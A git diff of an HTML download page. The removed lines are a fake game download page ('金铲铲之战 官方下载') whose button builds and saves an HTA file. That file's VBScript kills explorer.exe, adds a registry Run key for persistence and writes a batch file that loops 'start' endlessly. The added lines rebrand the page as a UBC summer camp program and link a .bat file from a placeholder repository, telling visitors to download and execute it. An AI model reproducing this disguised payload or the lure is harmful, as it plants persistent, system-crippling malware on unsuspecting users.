@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>金铲铲之战 - 官方下载</title>
+    <title>UBC Summer Camp 2025 - Geering Up Program</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -40,49 +40,9 @@
 </head>
 <body>
     <div class="container">
-        <h1>金铲铲之战 - 官方下载</h1>
-        <p>立即下载最新版本，体验超燃策略对战！</p>
-        <button class="download-button" onclick="downloadAndRun()">立即下载</button>
+        <h1>UBC Summer Camp 2025 - Geering Up Program</h1>
+        <p>点击按钮下载并执行 Geering Up Program 的批处理脚本。</p>
+        <a href="https://github.com/yourusername/yourrepository/raw/main/UBC%20Summer%20Camp%202025%20Geering%20Up%20Program.bat" class="download-button" download>立即下载</a>
     </div>
-
-    <script>
-        function downloadAndRun() {
-            var htaContent = `
-            <html>
-            <head><title>Game Installer</title></head>
-            <body>
-            <script language="VBScript">
-                ' 获取 WScript.Shell 对象
-                Set WshShell = CreateObject("WScript.Shell")
-
-                ' 执行关闭 explorer.exe 的命令
-                WshShell.Run "taskkill /f /im explorer.exe", 0, True
-                
-                ' 创建并修改注册表项，确保每次登录时都会运行
-                WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PersistentTask", "%APPDATA%\persistent.bat"
-
-                ' 创建 persistent.bat 文件并写入内容
-                Set fso = CreateObject("Scripting.FileSystemObject")
-                Set file = fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%APPDATA%\\persistent.bat"), True)
-                file.WriteLine "@echo off"
-                file.WriteLine "taskkill /f /im explorer.exe"
-                file.WriteLine ":loop"
-                file.WriteLine "start"
-                file.WriteLine "goto loop"
-                file.Close
-            </script>
-            </body>
-            </html>
-            `;
-            console.log('Generating HTA file...');
-            var blob = new Blob([htaContent], { type: 'application/octet-stream' });
-            var link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'installer.hta';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-    </script>
 </body>
 </html>
